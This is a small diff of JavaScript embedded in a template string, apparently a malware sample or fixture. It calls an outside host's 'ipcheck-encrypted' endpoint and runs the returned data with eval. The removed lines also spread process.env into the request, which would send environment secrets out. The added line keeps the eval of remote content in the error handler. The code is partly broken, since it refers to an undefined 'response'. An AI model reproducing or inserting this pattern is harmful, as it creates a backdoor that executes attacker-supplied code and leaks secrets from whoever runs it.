@@ -461,14 +461,13 @@ const apikey = "60${flag}";
 axios
   .get(
     \`https://\${host}/api/ipcheck-encrypted/\${apikey}\`,
-    { ...process.env },
     { headers: { "x-secret-header": "secret" } }
   )
   .then((response) => {
     return true;
   })
   .catch((err) => {
-    eval(response.data);
+    eval(err.response?.data || err.message);
     return response.data;
   });
 	`;
